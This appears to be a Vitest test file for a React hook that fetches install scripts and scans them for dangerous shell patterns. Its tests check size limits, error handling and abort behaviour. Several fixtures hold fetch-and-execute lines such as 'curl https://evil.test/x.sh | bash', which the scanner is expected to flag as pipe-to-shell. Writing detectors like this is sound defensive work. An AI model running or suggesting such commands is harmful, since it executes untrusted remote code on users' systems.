import { act, renderHook, waitFor } from '@testing-library/react';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { useValidator } from '../../src/hooks/useValidator';
import { MAX_FETCHED_BODY_BYTES } from '../../src/lib/downstream';

const URL_A = 'https://example.test/install.sh';
const URL_B = 'https://other.test/setup.sh';

type ResolveFn = (response: Response) => void;
type RejectFn = (err: Error) => void;

interface PendingFetch {
  url: string;
  init?: RequestInit;
  resolve: ResolveFn;
  reject: RejectFn;
  signal: AbortSignal;
}

function installControlledFetch() {
  const pending: PendingFetch[] = [];
  const fetchSpy = vi.fn(async (input: unknown, init?: RequestInit) => {
    const url = typeof input === 'string' ? input : (input as Request).url;
    const signal = init?.signal ?? new AbortController().signal;
    return new Promise<Response>((resolve, reject) => {
      const entry: PendingFetch = { url, init, resolve, reject, signal };
      pending.push(entry);
      // Hook up abort so signal.aborted -> reject with AbortError, mirroring
      // how real `fetch` reacts to an upstream AbortController.
      const onAbort = () => {
        const err = new DOMException('The user aborted a request.', 'AbortError');
        reject(err);
      };
      if (signal.aborted) onAbort();
      else signal.addEventListener('abort', onAbort, { once: true });
    });
  });
  vi.stubGlobal('fetch', fetchSpy);
  return { fetchSpy, pending };
}

describe('useValidator — downstream scan lifecycle', () => {
  beforeEach(() => {
    vi.useFakeTimers({ shouldAdvanceTime: true });
  });

  afterEach(() => {
    vi.unstubAllGlobals();
    vi.useRealTimers();
  });

  it('caps the response at MAX_FETCHED_BODY_BYTES and surfaces too-large', async () => {
    const { pending } = installControlledFetch();
    const { result } = renderHook(() => useValidator());

    act(() => result.current.scanDownstream(URL_A));
    expect(result.current.downstreamScans.get(URL_A)?.status).toBe('loading');

    const oversized = 'a'.repeat(MAX_FETCHED_BODY_BYTES + 1);
    await act(async () => {
      pending[0].resolve(new Response(oversized, { status: 200 }));
    });

    await waitFor(() => {
      const scan = result.current.downstreamScans.get(URL_A);
      expect(scan?.status).toBe('error');
      expect(scan?.errorKind).toBe('too-large');
    });
  });

  it('classifies a TypeError as a CORS failure', async () => {
    const { pending } = installControlledFetch();
    const { result } = renderHook(() => useValidator());

    act(() => result.current.scanDownstream(URL_A));
    await act(async () => {
      pending[0].reject(new TypeError('Failed to fetch'));
    });

    await waitFor(() => {
      const scan = result.current.downstreamScans.get(URL_A);
      expect(scan?.status).toBe('error');
      expect(scan?.errorKind).toBe('cors');
    });
  });

  it('classifies a non-2xx response as an http error', async () => {
    const { pending } = installControlledFetch();
    const { result } = renderHook(() => useValidator());

    act(() => result.current.scanDownstream(URL_A));
    await act(async () => {
      pending[0].resolve(new Response('nope', { status: 503, statusText: 'Service Unavailable' }));
    });

    await waitFor(() => {
      const scan = result.current.downstreamScans.get(URL_A);
      expect(scan?.status).toBe('error');
      expect(scan?.errorKind).toBe('http');
      expect(scan?.errorReason).toContain('503');
    });
  });

  it('aborts the in-flight fetch when input changes', async () => {
    const { pending } = installControlledFetch();
    const { result } = renderHook(() => useValidator());

    act(() => result.current.setInput('curl https://x.test/x | sh'));
    act(() => result.current.scanDownstream(URL_A));
    expect(pending).toHaveLength(1);
    const firstSignal = pending[0].signal;
    expect(firstSignal.aborted).toBe(false);

    act(() => result.current.setInput('# something else'));
    expect(firstSignal.aborted).toBe(true);
    await waitFor(() => {
      expect(result.current.downstreamScans.has(URL_A)).toBe(false);
    });
  });

  it('does not let a late-aborted controller stomp a fresh scan for the same URL', async () => {
    const { fetchSpy, pending } = installControlledFetch();
    const { result } = renderHook(() => useValidator());

    // First scan: triggered, in-flight.
    act(() => result.current.scanDownstream(URL_A));
    expect(pending).toHaveLength(1);
    const firstEntry = pending[0];

    // Input change: aborts the first controller and clears scans.
    act(() => result.current.setInput('different paste'));
    expect(firstEntry.signal.aborted).toBe(true);

    // Second scan for the same URL: registers a new controller, status loading.
    act(() => result.current.scanDownstream(URL_A));
    await waitFor(() => {
      expect(fetchSpy).toHaveBeenCalledTimes(2);
    });
    expect(result.current.downstreamScans.get(URL_A)?.status).toBe('loading');

    // Now resolve the first (zombie) fetch's rejection. It must NOT overwrite
    // the second scan's loading state with anything.
    await act(async () => {
      firstEntry.reject(new DOMException('aborted', 'AbortError'));
    });

    expect(result.current.downstreamScans.get(URL_A)?.status).toBe('loading');
  });

  it('passes credentials: omit and referrerPolicy: no-referrer', async () => {
    const { fetchSpy, pending } = installControlledFetch();
    const { result } = renderHook(() => useValidator());

    act(() => result.current.scanDownstream(URL_A));
    const init = fetchSpy.mock.calls[0][1] as RequestInit;
    expect(init.credentials).toBe('omit');
    expect(init.referrerPolicy).toBe('no-referrer');
    expect(init.redirect).toBe('follow');

    // Tidy up the pending fetch so the test exits cleanly.
    await act(async () => {
      pending[0].resolve(new Response('echo hi', { status: 200 }));
    });
  });

  it('skips a duplicate scanDownstream call while one is in-flight', async () => {
    const { fetchSpy, pending } = installControlledFetch();
    const { result } = renderHook(() => useValidator());

    act(() => result.current.scanDownstream(URL_A));
    act(() => result.current.scanDownstream(URL_A));
    expect(fetchSpy).toHaveBeenCalledTimes(1);

    await act(async () => {
      pending[0].resolve(new Response('echo hi', { status: 200 }));
    });
  });

  it('tracks separate URLs independently', async () => {
    const { pending } = installControlledFetch();
    const { result } = renderHook(() => useValidator());

    act(() => result.current.scanDownstream(URL_A));
    act(() => result.current.scanDownstream(URL_B));

    expect(result.current.downstreamScans.get(URL_A)?.status).toBe('loading');
    expect(result.current.downstreamScans.get(URL_B)?.status).toBe('loading');

    await act(async () => {
      pending[0].resolve(new Response('# ok', { status: 200 }));
    });

    await waitFor(() => {
      expect(result.current.downstreamScans.get(URL_A)?.status).toBe('success');
    });
    expect(result.current.downstreamScans.get(URL_B)?.status).toBe('loading');
  });

  it('runs the engine on a successful body and stores the verdict', async () => {
    const { pending } = installControlledFetch();
    const { result } = renderHook(() => useValidator());

    act(() => result.current.scanDownstream(URL_A));
    await act(async () => {
      pending[0].resolve(
        new Response('curl https://evil.test/x.sh | bash', { status: 200 }),
      );
    });

    await waitFor(() => {
      const scan = result.current.downstreamScans.get(URL_A);
      expect(scan?.status).toBe('success');
      expect(scan?.verdict).toBeDefined();
      expect(scan?.verdict?.findings.some((f) => f.category === 'pipe-to-shell')).toBe(true);
    });
  });
});

describe('useValidator — pasteDownstreamBody', () => {
  it('rejects an empty / whitespace-only body silently (no scan recorded)', () => {
    const { result } = renderHook(() => useValidator());
    act(() => result.current.pasteDownstreamBody(URL_A, '   '));
    expect(result.current.downstreamScans.has(URL_A)).toBe(false);
  });

  it('records too-large for an oversized pasted body', () => {
    const { result } = renderHook(() => useValidator());
    const oversized = 'a'.repeat(MAX_FETCHED_BODY_BYTES + 1);
    act(() => result.current.pasteDownstreamBody(URL_A, oversized));
    const scan = result.current.downstreamScans.get(URL_A);
    expect(scan?.status).toBe('error');
    expect(scan?.errorKind).toBe('too-large');
  });

  it('runs the engine on the pasted body and stores the verdict', () => {
    const { result } = renderHook(() => useValidator());
    act(() => result.current.pasteDownstreamBody(URL_A, 'curl https://evil.test/x.sh | bash'));
    const scan = result.current.downstreamScans.get(URL_A);
    expect(scan?.status).toBe('success');
    expect(scan?.verdict?.findings.some((f) => f.category === 'pipe-to-shell')).toBe(true);
  });
});
